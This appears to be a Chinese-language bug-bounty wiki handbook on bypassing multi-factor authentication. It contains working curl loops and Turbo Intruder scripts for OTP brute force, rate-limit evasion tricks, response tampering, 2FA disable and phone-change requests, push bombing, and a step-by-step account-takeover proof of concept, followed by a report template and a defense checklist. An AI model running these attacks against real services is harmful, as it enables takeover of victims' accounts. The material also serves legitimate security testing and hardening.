---
type: wiki
category: attack
tool: burp,turbo-intruder,manual
status: active
last-updated: 2026-04-21
---

# MFA / 2FA Bypass 手冊（2026 版）

> **用途：** MFA bypass = P1 / Critical（通常）。2FA 實作有 15+ 種常見破口。rate limit miss / race / response tampering / backup code enum 最常中。

## 0. Threat model

前提：attacker 已有 victim 密碼（credential stuffing / phishing / breach），MFA 是最後一關。

## 1. Rate limit missing

### 1.1 OTP brute force

```
# 6 位數 OTP = 1,000,000 組合
# 若無 rate limit + 30 秒 TTL → 可能來得及
```

```bash
# Burp Intruder / Turbo Intruder / ffuf
for i in {000000..999999}; do
  curl -s -X POST https://target.com/api/verify-otp \
    -H "Authorization: Bearer $SESSION" \
    -d "otp=$i" | grep -q success && echo "$i" && break
done
```

### 1.2 Turbo Intruder race + 多 IP

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100,
    )
    for i in range(1000000):
        engine.queue(target.req, str(i).zfill(6))
```

### 1.3 Rate limit per-session bypass

```
# 若 rate limit 綁 session token → 換 token 就清零
# 但多數還在驗 token 就 reject → 無用

# 若 rate limit 只綁 IP → 換 IP
# X-Forwarded-For: 1.2.3.4
```

## 2. Rate limit 但可繞（HTTP smuggling / parameter）

### 2.1 HTTP parameter pollution

```
otp=000000&otp=000001&otp=000002
# 若後端驗最後一個，計數器只加一次 → 每 req 試多值
```

### 2.2 Endpoint 差異

```
POST /api/verify-otp      → 有 rate limit
POST /api/v1/verify-otp   → 沒有（舊 version）
POST /verify-otp/          → 遺漏
POST /verify-otp%20        → trailing space
POST /verify-otp?_=1       → query 繞
```

### 2.3 Cookie / header 切換

```
# 有些 rate limit 綁特定 header
# Remove X-Request-ID / User-Agent 試
```

## 3. Response manipulation

### 3.1 Status code tampering

```bash
# 送任意 OTP → 回 "failed"
# Burp 改 response
HTTP/1.1 401 → 200 {"success":true}
```

若前端只看 `response.ok`，可繞。

### 3.2 JSON boolean flip

```json
// Server response
{"verified":false}

// Burp 改為
{"verified":true}
```

### 3.3 GraphQL response edit

```graphql
mutation { verifyOtp(code:"000000") { success } }
# Response 改 success=true
```

## 4. 2FA disable / reset

### 4.1 DELETE /2fa/settings

```bash
# 若 disable 2FA endpoint 沒 MFA re-auth
curl -X DELETE https://target.com/api/2fa \
  -H "Authorization: Bearer $PARTIAL_TOKEN"
# 若成功 → 直接關 2FA
```

### 4.2 Change phone / email without 2FA

```bash
# PATCH /api/user 改 phone → 下次 SMS 到 attacker
curl -X PATCH https://target.com/api/user \
  -H "Authorization: Bearer $PARTIAL_TOKEN" \
  -d '{"phone":"+1234567890"}'
```

### 4.3 Forgot 2FA flow

```
"Lost 2FA device" → 流到 email 驗證
若只驗 email（attacker 已有 victim 密碼 + 或許 email 存取）→ bypass
```

## 5. Session / token 問題

### 5.1 Pre-MFA token 有過多權限

```
# Login step 1 回 pre_auth_token
# 理論上只能呼叫 /verify-otp
# 但實際 /api/users/me /api/profile 都能呼叫（未 scope）
→ 視為已登入
```

### 5.2 Token 重用

```
# MFA 通過 → 發 final token
# 若 pre_auth_token 再用一次登入 → 也回 final token（壞 impl）
```

### 5.3 Cookie 透露 auth state

```
Cookie: authState=MFA_REQUIRED
攻擊者改 authState=AUTHENTICATED
```

## 6. 備援碼攻擊

### 6.1 Backup code brute

```
# 10 組備援碼，每組 8 字元（alphanum）
# 若無 rate limit 無法 brute 全部，但可能：
# - 加入 rate limit 但只針對 OTP，沒針對 backup code
# - Backup code 格式差（4 位數）→ 10000 組可 brute
```

### 6.2 Backup code 生成可預測

```
# 若用 Math.random() / time seed → 可預測
# 見 [81-03-random-prng-issues.md] 或 OWASP crypto
```

### 6.3 Reset 洩漏舊 backup code

```
# Reset backup codes 後，API 是否顯示舊 codes？
# 某些 app 顯示 (hashed) 但比對用 plain text → 可 derive
```

## 7. Push-based MFA 攻擊

### 7.1 Push bombing（MFA fatigue）

```
# 攻擊者連續 login 100 次 → victim 手機收 100 個 push
# 最終 victim 點 "allow"（或按錯） → 突破
```

2022 Uber 就是這樣進去的。

### 7.2 Number matching bypass

2026 Google / Microsoft push 強制要求手動輸 2 位數 challenge → 降低 fatigue 成功率，但仍有 IT 使用者習慣性按同意。

### 7.3 同時 session

```
# 同時開兩個 tab，第一個觸發 push，第二個在 victim 授權後 race
```

## 8. SMS 攔截（Side-channel）

### 8.1 SIM swap

社交工程 telco → 轉移 SIM → 攔 SMS。這已不算 web 漏洞，但 program 可能要求 SMS 不應為唯一 MFA。

### 8.2 SS7 attack（通常 OOS）

### 8.3 Mobile malware forward SMS

## 9. TOTP 特殊攻擊

### 9.1 Time-window reuse

```
# TOTP 30 秒有效
# 若 server 記不得已用 code → attacker 抓 victim 的 code 在 30 秒內也能用
```

### 9.2 Secret leak

```
# QR code 註冊 TOTP 時 leak secret（URL parameter, log, /etc/*.env）
# → attacker 自己算 TOTP
```

### 9.3 Time skew

```
# 若 server 接受 ±30 秒 window → 2 x 6 位 = 2,000,000 組合（但仍 rate limit 依賴）
```

## 10. WebAuthn 攻擊

少見但 2026 出現：

### 10.1 Cross-origin challenge reuse

若 challenge 未 scope 到 RP ID → 可 relay。

### 10.2 User verification flag downgrade

Challenge 未要求 `userVerification: required` → attacker 的惡意 authenticator 可 skip PIN。

### 10.3 Credential enumeration

註冊 flow leaking username registered status。

## 11. Remember-device / trust cookie

### 11.1 Predictable device_id

```
# Cookie: device_id=MD5(username + "_trusted")
# 可預測 → 攻擊者自己 set cookie
```

### 11.2 Device cookie 不綁 session

```
# Attacker 從自己 session 抓 trust cookie
# 轉給 victim session → victim 下次 login 不需 MFA
```

### 11.3 Trust cookie 不過期

永久 trust = 單 XSS 即可永久 bypass MFA。

## 12. OAuth / SSO bypass MFA

### 12.1 SSO endpoint 繞 MFA

```
# Direct login 有 MFA
# 但 /auth/saml/callback 接受 SAML assertion → 不驗 MFA state
```

### 12.2 Legacy endpoint

```
/api/v1/login         → 新，有 MFA
/api/mobile/login     → 舊，沒 MFA
```

## 13. 完整 PoC：OTP no rate limit → ATO

### Step 1: Login step 1

```bash
curl -X POST https://target.com/api/login \
  -d '{"email":"victim@example.com","password":"pwned_from_breach"}' \
  -c cookies.txt

# Response
{"status":"mfa_required","session":"PRE_AUTH_TOKEN_XXX"}
```

### Step 2: 測 rate limit

```bash
for i in 000000 000001 000002 000003 000004; do
  curl -s -X POST https://target.com/api/verify-otp \
    -H "Cookie: session=PRE_AUTH_TOKEN_XXX" \
    -d "{\"otp\":\"$i\"}"
  echo
done
# 5 次都回 {"error":"invalid"} 無 rate limit 跡象
```

### Step 3: Turbo Intruder brute

```python
# 1,000,000 組合 @ 50 concurrent → 約 5 分鐘打完
# Success response 多一個 "token" field
```

### Step 4: 成功取得 final token

```
{"success":true,"token":"FINAL_AUTH_TOKEN"}
```

### Step 5: 驗證帳號接管

```bash
curl https://target.com/api/users/me \
  -H "Authorization: Bearer FINAL_AUTH_TOKEN"
# → victim 資料
```

### Step 6: 報告

```markdown
## 漏洞概述
POST https://target.com/api/verify-otp 未對 pre-auth session 施加 rate
limit，攻擊者可在 MFA 驗證步驟 brute-force 6 位數 OTP（1,000,000 組合），
於 OTP 有效期內（~60 秒延長視後端 implementation）完成 2FA bypass，
達成完整帳號接管（只要擁有密碼）。

## PoC
[Login step 1 取得 PRE_AUTH_TOKEN + Turbo Intruder script + success response]

## Impact
- 擁有使用者密碼即可完全接管（MFA 失效）
- 結合 credential stuffing list → 大規模 ATO

## Severity
P1 / Critical（MFA bypass）

## 修補
1. 每 session 限制 5-10 次 OTP 嘗試，超過 lock session + 重新 login
2. 驗證次數全局限制（IP + account）
3. OTP 失敗 3 次後 TTL 立即失效
4. 加 delay（expo backoff）
5. 超過 X 次失敗 → 強制 email 通知 + 要求額外 verification
```

## 14. 防禦 checklist

```
1. Per-account + per-IP rate limit（5 次 / 10 分鐘）
2. OTP TTL ≤ 60 秒 + single-use（驗過就失效）
3. Failed attempt counter，3-5 次後 lock
4. Backup code 至少 8 字元 alphanum，一次性
5. Disable 2FA / change phone / change email 都需 re-auth（2FA 再次）
6. Pre-MFA token scope 嚴格（只能 verify-otp，不能拿資料）
7. Trust device cookie 綁 session，定期 re-verify
8. Push MFA 加 number matching（2 位數 challenge）
9. Mobile + Web 統一 auth flow，不開 legacy endpoint
10. Log 所有 MFA 失敗 → alert anomaly
```

## 關聯文件

- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) — OAuth SSO 繞 MFA
- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) — GraphQL batching 繞 rate limit
- [68-websocket-cswsh.md](68-websocket-cswsh.md) — WS auth race
- PortSwigger 2FA：https://portswigger.net/web-security/authentication/multi-factor
- OWASP MFA Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html
